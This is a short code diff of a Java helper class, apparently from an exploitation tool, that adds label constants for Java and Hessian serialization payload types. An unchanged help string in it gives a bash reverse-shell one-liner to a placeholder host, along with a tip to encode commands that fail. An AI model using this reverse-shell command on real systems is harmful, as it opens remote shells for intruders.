@@ -12,6 +12,11 @@ public class DetailHelper {
             "2. reverse shell: /bin/bash -i >& /dev/tcp/x.x.x.x/port 0>&1<br>" +
             "3. if not work, try to encode the command. https://jackson-t.ca/runtime-exec-payloads.html<br>";
 
+    public final static String ALL_PAYLOAD = "Any Payload";
+    public final static String NO_NEED_PAYLOAD = "Do not need Payload";
+    public final static String ALL_JAVA_PAYLOAD = "Any Java Serialization Payload";
+    public final static String ALL_HESSIAN_PAYLOAD = "Any Hessian Serialization Payload";
+
     public final static String BODY =
             "根据effect类型填充body内容，分别如下：<br>" +
             "1. default, body=command<br>" +
